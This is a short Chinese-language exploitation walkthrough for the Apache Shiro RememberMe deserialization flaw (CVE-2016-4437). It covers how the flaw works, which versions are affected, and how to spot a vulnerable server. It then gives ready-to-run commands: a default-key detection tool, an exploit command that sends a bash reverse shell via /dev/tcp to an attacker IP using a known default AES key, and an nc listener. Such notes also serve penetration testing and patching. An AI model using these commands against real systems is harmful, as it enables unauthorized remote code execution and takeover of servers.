shiro550(CVE-2016-4437)

描述

Apache Shiro RememberMe 反序列化导致的命令执行漏洞

原理

Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。

Payload生成：命令=>序列化=>AES加密=>base64编码=>RememberMe Cookie值

在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么久很容易就知道密钥，payload构造起来也是十分简单。

影响版本

Apache Shiro < 1.2.4

特征判断

返回包中包含rememberMe=deleteMe字段

复现
漏洞检测

检查是否存在默认的key

github项目地址：https://github.com/insightglacier/Shiro_exploit

使用方法

#python2/3 shiro_exploit.py -u "http://192.168.1.110:8080"

漏洞利用

反弹shell

工具github项目地址:https://github.com/teamssix/shiro-check-rce

使用方法

如果知道key的话，就直接 -k 指定 key 即可

python3 shiro-check-rce.py -u {target_URL} -c "bash -i >& /dev/tcp/{your_nc_ip}/{your_nc_port} 0>&1" -k {key}

示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c "bash -i >& /dev/tcp/192.168.175.152/9527 0>&1" -k kPH+bIxk5D2deZiIxcaaaA==

攻击机监听端口

nc -lvvp 4455
